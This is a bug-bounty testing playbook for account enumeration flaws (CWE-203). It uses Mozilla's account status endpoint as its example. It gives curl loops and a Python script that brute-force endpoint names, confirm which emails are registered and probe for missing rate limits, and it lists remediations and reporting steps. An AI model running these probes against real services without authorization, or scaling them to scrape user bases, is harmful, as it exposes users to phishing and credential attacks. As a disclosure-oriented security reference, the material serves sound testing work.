# Account Enumeration Testing — Universal Pattern (verified 2026-06-18, Mozilla)

## The bug class

Almost every public-facing web app has an account-status / lookup / recover endpoint that tells an unauthenticated caller whether a given email/username is registered. When it does, AND when the endpoint has no rate limit AND no auth requirement, it's a CWE-203 Information Disclosure finding that scores 5.0-7.0 CVSS.

Mozilla's `/v1/account/status` was the cleanest case found in the wild:
- No auth
- No rate limit (verified 4.4 req/s sustained, 20/20 successful, 0 × 429)
- Clear boolean response: `{"exists": true}` or `{"exists": false}`
- Affects ALL Mozilla/Firefox account users (single shared auth backend)

## Discovery ladder (run all 4)

```bash
# 1. Read the OIDC config — often lists the endpoints
curl -s https://accounts.firefox.com/.well-known/openid-configuration | jq

# 2. Brute-force common endpoint names on the auth base URL
for ep in account/status account/exists account/check \
          user/lookup users/lookup users/exists \
          auth/check auth/exists auth/lookup \
          email/check email/lookup email/exists \
          signup/check signup/exists signup/availability \
          recover/start recover/lookup; do
  r=$(curl -sk -o /dev/null -w "%{http_code}" \
       -X POST "https://api.accounts.firefox.com/v1/${ep}" \
       -H "Content-Type: application/json" \
       -d '{"email":"admin@mozilla.com"}')
  echo "$r $ep"
done

# 3. GraphQL introspection (if GraphQL endpoint found) — search for `exists`/`available` fields
curl -sk -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name args { name type { name } } } } } }"}' | jq

# 4. SPA bundle grep — fetch main.js, grep for endpoint paths
curl -s https://accounts.firefox.com/ | grep -oE 'src="[^"]*\.js"' | head -5
# Then grep those JS files for `/v1/account`, `/api/users`, etc.
```

## Confirm the leak (4 test cases)

```bash
# Test with: your own email, a likely-valid email, a clearly-invalid email, an admin email
for email in "you@yours.com" "admin@target.com" "nobody-12345@example.com" "support@target.com"; do
  curl -sk -X POST "https://api.accounts.firefox.com/v1/account/status" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\"}" | jq
done
# Expected (leak): {"exists": true} for some, {"exists": false} for others
# If ALL return same response (or 401/403) → no leak, move on
```

## Rate limit probe (the multiplier)

```bash
# 20 requests, no delay. If ALL 200, rate limit is missing.
python3 -c "
import requests, time
start = time.time(); ok = 0; rl = 0
for i in range(20):
    r = requests.post('https://api.accounts.firefox.com/v1/account/status',
                      json={'email': f'ratelimit_{i}@x.com'}, timeout=5)
    if r.status_code == 200: ok += 1
    if r.status_code == 429: rl += 1
elapsed = time.time() - start
print(f'{ok}/20 OK, {rl} × 429, {elapsed:.2f}s ({20/elapsed:.1f} req/s)')
print('RATE LIMIT MISSING' if rl == 0 else f'Rate limit present ({rl} × 429)')
"
```

## Other status-leak surfaces to probe

| Pattern | Example | Severity bump |
|---|---|---|
| `POST /v1/account/status` body `{email}` | Mozilla, GitLab, many SaaS | +1.0 if no rate limit |
| `POST /v1/recovery/start` or `/forgot` | Most apps | Often has same leak; sometimes only rate-limited on THIS path |
| `POST /v1/email/availability` (signup flow) | Many apps | The "username taken" error is the same leak |
| `GET /users/{handle}` → 200 vs 404 (without auth on public profile) | Twitter, GitHub, etc. | Often by design — but check for 200+data vs 200+empty |
| GraphQL `query { user(email: "x") { id } }` | Apps with GraphQL | CWE-203 + IDOR potential |
| OAuth `client_id` lookup → 200 vs 401 | OAuth providers | Discloses valid clients |
| OIDC `iss` + `sub` combo | Federated IdP | If sub is enumerable, account takeover via sub confusion |
| Password reset flow → different response for valid vs invalid email | Most apps | CWE-204: Observable Response Discrepancy |

## Where Mozilla's report lives

See `/tmp/recon-mozilla/h1_report_FINDING1_ENUMERATION.txt` for the full paste-ready H1 report (FIELD-labeled, 93 lines, 5.3KB). The body is split into 12 fields (TITLE, ASSET TYPE, WEAKNESS, SEVERITY, ENDPOINT, DESCRIPTION, IMPACT, REMEDIATION, CVSS VECTOR, DISCOVERED, TEST ENV, REFERENCES) plus a "CARA PASTE KE H1" footer mapping each field to the H1 form field.

## Where this pattern applies

- Any H1 program with public signup (Mozilla, Figma, GitHub, Visma, etc.)
- Any SaaS that exposes /api/auth/* or /api/users/* unauthenticated
- Any OIDC provider's /account/status or /signup/availability endpoint
- Password reset flows (most apps have the same leak via /forgot)

The Mozilla case scored 5.3 base CVSS but upgraded to Med-High because of the missing rate limit (4.4 req/s = 380K/day from one IP = bulk-scrapable entire user base).

## Remediations to recommend in the report

1. Require authentication (session token or OAuth bearer) for status checks
2. Add gateway-level rate limiting (5/min/IP, 50/hour/IP)
3. Return generic response regardless of account existence (timing + body equalized)
4. Add CAPTCHA or proof-of-work for unauthenticated callers
5. Log + alert on enumeration patterns (100+ requests/IP/10min)
6. Consider differential privacy or rate-limited search instead of boolean check
